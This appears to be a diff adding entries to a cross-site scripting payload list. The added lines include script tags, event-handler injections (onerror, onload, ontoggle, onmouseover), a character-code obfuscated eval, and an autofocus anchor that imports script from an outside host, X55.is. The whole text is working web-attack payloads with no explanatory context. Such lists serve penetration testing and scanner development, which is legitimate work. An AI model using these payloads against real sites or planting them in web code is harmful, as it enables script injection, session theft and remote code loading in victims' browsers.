@@ -2,7 +2,14 @@ xyztest");alert(origin);//
 xyz,test");alert(origin);// 
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 <body onload="print()">
-
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<details open ontoggle=alert(document.domain)>
+" onmouseover="alert(1)"
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>
+****************************************
 <script>alert('1')</script>
 "><script>alert('1')</script>
 <svg/onload=alert('1');
